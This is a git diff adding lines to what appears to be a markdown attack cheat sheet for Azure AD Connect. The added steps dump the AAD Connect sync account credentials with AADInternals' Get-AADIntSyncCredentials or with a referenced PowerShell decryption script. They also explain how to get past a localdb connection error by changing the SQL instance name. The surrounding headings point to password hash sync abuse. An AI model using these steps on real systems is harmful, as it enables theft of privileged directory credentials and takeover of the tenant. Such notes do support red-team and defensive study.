@@ -166,10 +166,24 @@ Get-ADSyncConnector
 ```
 
 #### Dumping AAD Connect credentials
+- If it fails check if the service is running
 ```
 Import-Module .\AADInternals.psd1
 Get-AADIntSyncCredentials
 ```
+
+- Or use https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c#file-azuread_decrypt_msol_v2-ps1
+```
+powershell.exe -f C:\users\public\azuread_decrypt_msol_v2.ps1
+```
+
+#### Error
+- If the error `[!] Could not connect to localdb...` shows. Change the SQL Instance name
+```
+Import-Module "C:\Program Files\Microsoft Azure AD Sync\Bin\ADSync\ADSync.psd1"
+Get-ADSyncDatabaseConfiguration
+```
+- Edit line 4 of the script
 
 ## Password Hash Sync Abuse
 #### Turn on password hash sync
